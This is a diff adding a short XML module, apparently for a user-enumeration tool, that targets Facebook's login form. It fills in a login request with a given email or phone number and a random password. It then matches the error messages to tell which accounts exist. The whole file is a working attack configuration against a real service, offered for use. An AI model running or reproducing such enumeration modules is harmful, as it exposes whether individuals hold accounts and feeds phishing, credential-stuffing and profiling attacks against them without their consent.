@@ -1,0 +1,24 @@
+<!-- 
+Facebook.com - Logon user enumeration issue
+
+username and phone number only (permalinks are not enumerable)
+-->
+<module>
+    <site>
+        <name>facebook.com (Email/Phone)</name>
+        <url><![CDATA[https://www.facebook.com/login.php]]></url>
+        <method>POST</method>
+        <postParameters><![CDATA[lsd=AVoFLhuN&return_session=0&legacy_return=1&display=&session_key_only=0&trynum=1&charset_test=%E2%82%AC%2C%C2%B4%2C%E2%82%AC%2C%C2%B4%2C%E6%B0%B4%2C%D0%94%2C%D0%84&timezone=-120&lgnrnd=085949_4lB2&lgnjs=n&email=<ACCOUNT>&pass=<RANDOM>&default_persistent=1&login=Log+In]]></postParameters>
+        <headers>Accept-Language: en-gb</headers>
+        <requestCookie>true</requestCookie>
+        <requestCSRF>false</requestCSRF>
+        <successmatch>The password you entered is incorrect</successmatch>
+        <negativematch>not (belong to|associated with)</negativematch>
+        <errormatch>Security Check</errormatch>
+        <message>Account names must be in email address or telephone number format. Permalinks will cause flase positives</message>
+        <date>08/10/2012</date>
+        <version>4</version>
+        <author>CJR</author>
+        <category>social</category>
+    </site>
+</module>
